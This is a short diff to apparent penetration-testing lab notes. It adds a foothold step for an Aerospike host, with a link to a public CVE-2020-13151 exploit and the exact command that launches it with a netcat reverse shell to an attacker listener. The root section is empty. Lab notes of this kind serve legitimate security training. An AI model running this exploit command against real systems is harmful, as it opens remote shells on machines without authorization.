@@ -52,6 +52,14 @@ SF:03\.0\0Fpostmaster\.c\0L2113\0RProcessStartupPacket\0\0");
 Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+## Foothold
+1. found api endpoint ``` http://aero/api/heartbeat ``` -> aerospike is running
+2. https://github.com/b4ny4n/CVE-2020-13151/tree/master 
+3. ``` python3 49067.py --ahost 192.168.181.143 --aport 3000 --netcatshell --lhost=192.168.45.204 --lport=80 ```
+
+## Root
+1. 
+
 # Crystal .144
 ```
 PORT   STATE SERVICE VERSION
